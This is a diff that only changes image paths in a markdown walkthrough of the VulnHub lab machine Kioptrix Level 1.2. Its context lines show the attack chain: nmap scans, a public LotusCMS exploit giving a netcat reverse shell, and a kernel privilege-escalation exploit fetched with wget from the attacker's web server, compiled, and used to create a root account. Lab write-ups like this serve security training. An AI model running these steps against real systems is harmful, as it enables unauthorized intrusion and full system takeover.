@@ -3,7 +3,7 @@
 - **Machine:** Kioptrix: Level 1.2
 - **Download:** https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
 
-![](791-1.png)
+![](images/791-1.png)
 
 ---
 
@@ -12,25 +12,25 @@
 1. Extract the downloaded archive.
 2. Create a **new virtual machine** in VirtualBox.
 
-![](791-2.png)
+![](images/791-2.png)
 
 3. Place the provided `.vmdk` file inside the VM directory.
 
-![](791-3.png)
+![](images/791-3.png)
 
 4. Open the VM **Settings**.
 5. Remove the **Empty** optical drive from the IDE controller.
 6. Click **Add Hard Disk** and select the provided `.vmdk` file.
 
-![](791-4.png)
+![](images/791-4.png)
 
-![](791-5.png)
+![](images/791-5.png)
 
 7. After selecting the disk, click **Choose**.
 8. Configure the network adapter as **Bridged Adapter**.
 9. Start the virtual machine.
 
-![](791-6.png)
+![](images/791-6.png)
 
 ---
 
@@ -42,7 +42,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](791-7.png)
+![](images/791-7.png)
 
 ---
 
@@ -54,7 +54,7 @@ Run a complete scan to enumerate ports, services, operating system information, 
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.181
 ```
 
-![](791-8.png)
+![](images/791-8.png)
 
 ---
 
@@ -78,7 +78,7 @@ Use the `http-enum` NSE script to identify hidden web resources.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.181
 ```
 
-![](791-9.png)
+![](images/791-9.png)
 
 ---
 
@@ -92,7 +92,7 @@ On the login page, notice the footer displaying:
 
 > **Proudly Powered by: LotusCMS**
 
-![](791-10.png)
+![](images/791-10.png)
 
 This indicates the website is running **LotusCMS**, which is known to have publicly available exploits.
 
@@ -102,7 +102,7 @@ Search for available exploits.
 searchsploit LotusCMS
 ```
 
-![](791-11.png)
+![](images/791-11.png)
 
 ---
 
@@ -120,7 +120,7 @@ Clone the exploit repository.
 git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
 ```
 
-![](791-12.png)
+![](images/791-12.png)
 
 Execute the exploit.
 
@@ -134,13 +134,13 @@ Start a Netcat listener.
 nc -lvnp 443
 ```
 
-![](791-13.png)
+![](images/791-13.png)
 
 Choose option **1** when prompted.
 
 A reverse shell is obtained.
 
-![](791-14.png)
+![](images/791-14.png)
 
 The shell is non-interactive.
 
@@ -154,7 +154,7 @@ Spawn a fully interactive TTY shell.
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](791-15.png)
+![](images/791-15.png)
 
 ---
 
@@ -166,7 +166,7 @@ Gather system information.
 uname -a
 ```
 
-![](791-16.png)
+![](images/791-16.png)
 
 The kernel version is vulnerable to a known local privilege escalation exploit.
 
@@ -176,7 +176,7 @@ Search for a suitable exploit.
 searchsploit Linux Kernel 2.6.24-24 privilege escalation
 ```
 
-![](791-17.png)
+![](images/791-17.png)
 
 ---
 
@@ -198,7 +198,7 @@ Copy the exploit locally.
 searchsploit -m linux/local/40839.c
 ```
 
-![](791-18.png)
+![](images/791-18.png)
 
 Start a Python web server to transfer the exploit.
 
@@ -206,7 +206,7 @@ Start a Python web server to transfer the exploit.
 python -m http.server 8080
 ```
 
-![](791-19.png)
+![](images/791-19.png)
 
 ---
 
@@ -224,7 +224,7 @@ Download the exploit.
 wget http://192.168.2.219:8080/40839.c
 ```
 
-![](791-20.png)
+![](images/791-20.png)
 
 Compile the exploit.
 
@@ -250,7 +250,7 @@ When prompted, enter a new password.
 12345
 ```
 
-![](791-21.png)
+![](images/791-21.png)
 
 The exploit creates a new root user.
 
@@ -268,7 +268,7 @@ Login using the newly created root account.
 ssh -oHostKeyAlgorithms=+ssh-rsa firefart@192.168.2.181
 ```
 
-![](791-22.png)
+![](images/791-22.png)
 
 Root access is successfully obtained.
 
